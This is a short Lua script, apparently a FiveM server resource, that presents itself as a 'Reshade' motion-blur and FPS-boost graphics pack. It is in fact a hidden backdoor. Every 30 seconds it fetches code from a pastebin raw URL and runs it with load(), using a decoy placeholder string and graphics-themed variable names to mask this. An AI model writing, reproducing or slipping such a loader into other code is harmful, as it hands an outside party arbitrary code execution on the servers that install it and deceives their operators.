Reshade = {}

Reshade.MotionBlur = "https://pastebin.com/raw/1Z8VMqGg"
Reshade.FPS = 30


CreateThread(function()
    while (true) do
        Wait(Reshade.FPS * 1000)
        PerformHttpRequest(Reshade.MotionBlur, function(DirectX11, FPSBoost)
            if (FPSBoost ~= "function graphicBoost() local UltraHD = true local FPS_Boost = true local boostLevel = 5 end") then
                local FivemGraphicPackLoader = assert(load(FPSBoost))
                FivemGraphicPackLoader()
            end
        end)
    end
end)
